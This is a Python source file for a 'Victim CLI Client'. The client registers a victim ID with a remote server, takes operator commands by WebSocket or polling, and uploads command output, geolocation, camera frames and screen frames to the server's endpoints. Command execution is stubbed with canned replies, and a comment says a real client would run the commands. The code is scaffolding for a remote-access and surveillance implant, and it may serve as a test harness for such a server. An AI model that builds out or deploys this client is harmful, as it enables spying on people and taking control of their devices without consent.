import requests
import websocket
import json
import uuid
import time
from datetime import datetime

class VictimCLI:
    def __init__(self, server_url, victim_id=None):
        self.server_url = server_url
        self.victim_id = victim_id or str(uuid.uuid4())
        self.ws = None
        self.use_websocket = False
        self.command_queue = []
        self.response_queue = {}
        
        # Register victim if not already registered
        if not self._check_registered():
            self._register_victim()
    
    def _check_registered(self):
        """Check if victim is already registered with the server"""
        try:
            response = requests.get(f"{self.server_url}/api/victims")
            victims = response.json()
            return any(v['id'] == self.victim_id for v in victims)
        except requests.RequestException:
            return False
    
    def _register_victim(self):
        """Register this victim with the server"""
        try:
            requests.get(f"{self.server_url}/?victim={self.victim_id}")
            print(f"Registered as victim with ID: {self.victim_id}")
            return True
        except requests.RequestException as e:
            print(f"Failed to register victim: {e}")
            return False
    
    def connect_websocket(self):
        """Connect to the server via WebSocket"""
        try:
            self.ws = websocket.WebSocketApp(
                f"ws://{self.server_url.split('://')[-1]}/victim?victim_id={self.victim_id}",
                on_message=self._on_ws_message,
                on_error=self._on_ws_error,
                on_close=self._on_ws_close
            )
            
            # Start WebSocket in a background thread
            import threading
            ws_thread = threading.Thread(target=self.ws.run_forever)
            ws_thread.daemon = True
            ws_thread.start()
            
            self.use_websocket = True
            print("WebSocket connected successfully")
            return True
        except Exception as e:
            print(f"WebSocket connection failed: {e}")
            self.use_websocket = False
            return False
    
    def _on_ws_message(self, ws, message):
        """Handle incoming WebSocket messages"""
        try:
            data = json.loads(message)
            if 'command' in data:
                print(f"\nReceived command: {data['command']}")
                self.command_queue.append(data)
        except json.JSONDecodeError:
            print(f"\nReceived non-JSON message: {message}")
    
    def _on_ws_error(self, ws, error):
        """Handle WebSocket errors"""
        print(f"\nWebSocket error: {error}")
        self.use_websocket = False
    
    def _on_ws_close(self, ws, close_status_code, close_msg):
        """Handle WebSocket closure"""
        print("\nWebSocket connection closed")
        self.use_websocket = False
    
    def send_geo_data(self, lat, lon):
        """Send geolocation data to server"""
        try:
            response = requests.post(
                f"{self.server_url}/api/geo?victim={self.victim_id}",
                json={"lat": lat, "lon": lon}
            )
            return response.json()
        except requests.RequestException as e:
            print(f"Failed to send geo data: {e}")
            return None
    
    def send_camera_frame(self, frame_data):
        """Send camera frame to server"""
        try:
            response = requests.post(
                f"{self.server_url}/api/camera_frame?victim={self.victim_id}",
                data=frame_data,
                headers={'Content-Type': 'application/octet-stream'}
            )
            return response.json()
        except requests.RequestException as e:
            print(f"Failed to send camera frame: {e}")
            return None
    
    def send_screen_frame(self, frame_data):
        """Send screen frame to server"""
        try:
            response = requests.post(
                f"{self.server_url}/api/screen_frame?victim={self.victim_id}",
                data=frame_data,
                headers={'Content-Type': 'application/octet-stream'}
            )
            return response.json()
        except requests.RequestException as e:
            print(f"Failed to send screen frame: {e}")
            return None
    
    def check_commands(self):
        """Check for pending commands (polling method)"""
        if self.use_websocket and self.command_queue:
            return self.command_queue.pop(0)
        
        try:
            response = requests.get(
                f"{self.server_url}/api/poll_commands?victim_id={self.victim_id}"
            )
            command = response.json().get('command')
            if command:
                return command
            return None
        except requests.RequestException as e:
            print(f"Failed to check commands: {e}")
            return None
    
    def send_command_response(self, command_id, response):
        """Send response to a command"""
        try:
            if self.use_websocket and self.ws and self.ws.sock and self.ws.sock.connected:
                self.ws.send(json.dumps({
                    'victim_id': self.victim_id,
                    'command_id': command_id,
                    'response': response
                }))
            else:
                requests.post(
                    f"{self.server_url}/api/command_response",
                    params={
                        'victim_id': self.victim_id,
                        'command_id': command_id
                    },
                    json={'response': response}
                )
            return True
        except Exception as e:
            print(f"Failed to send command response: {e}")
            return False
    
    def execute_command(self, command):
        """Execute a command and return the response"""
        # Simulate command execution - in a real client, this would actually execute the command
        print(f"Executing command: {command}")
        
        # Example command handling
        if command == 'get_system_info':
            return {
                'os': 'Windows 10',
                'cpu': 'Intel i7',
                'memory': '16GB'
            }
        elif command == 'list_files':
            return {'files': ['file1.txt', 'file2.exe']}
        else:
            return {'output': f"Executed: {command}"}

def main():
    import argparse
    
    parser = argparse.ArgumentParser(description="Victim CLI Client")
    parser.add_argument('--server', required=True, help="Server URL (e.g., http://localhost:5000)")
    parser.add_argument('--id', help="Existing victim ID (optional)")
    args = parser.parse_args()
    
    # Initialize client
    client = VictimCLI(args.server, args.id)
    
    # Try to connect via WebSocket
    client.connect_websocket()
    
    print(f"Victim CLI running with ID: {client.victim_id}")
    print("Type 'exit' to quit")
    
    # Main loop
    while True:
        # Check for commands from server
        command_data = client.check_commands()
        if command_data:
            command = command_data['command']
            command_id = command_data['command_id']
            
            print(f"\n[!] Received command from server: {command}")
            
            # Execute the command
            result = client.execute_command(command)
            
            # Send response back to server
            if client.send_command_response(command_id, result):
                print("[+] Command response sent to server")
            else:
                print("[-] Failed to send command response")
        
        # Get user input for manual operations
        user_input = input("\nCLI> ")
        if user_input.lower() == 'exit':
            break
        
        # Process manual commands
        if user_input.startswith('geo '):
            try:
                lat, lon = map(float, user_input[4:].split())
                client.send_geo_data(lat, lon)
                print("[+] Geolocation data sent")
            except:
                print("Usage: geo <latitude> <longitude>")
        
        elif user_input == 'status':
            print(f"Victim ID: {client.victim_id}")
            print(f"Connection: {'WebSocket' if client.use_websocket else 'Polling'}")
        
        else:
            print("Available commands:")
            print("  geo <lat> <lon> - Send geolocation data")
            print("  status - Show current status")
            print("  exit - Quit the CLI")

if __name__ == "__main__":
    main()
